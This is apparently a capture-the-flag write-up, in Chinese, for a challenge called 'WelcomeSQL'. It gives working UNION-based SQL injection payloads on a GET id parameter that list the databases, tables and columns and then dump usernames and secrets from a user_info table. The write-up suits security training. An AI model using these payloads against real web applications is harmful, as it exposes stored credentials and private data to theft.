## WelcomeSQL

简单的无过滤整型sql注入，网页源码提示GET方法传入id参数

Payload:

```
id=0 union select 1,group_concat(schema_name) from information_schema.schemata
//获取数据库
id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema='WelcomeSQL'
//获取WelcomeSQL库中的表
id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema='WelcomeSQL' and table_name = 'user_info'
//获取user_info表中的字段
id=0 union select 1,group_concat(id,'_',username,'_',secret) from WelcomeSQL.user_info
//获取字段内容
```

在admin的secret发现flag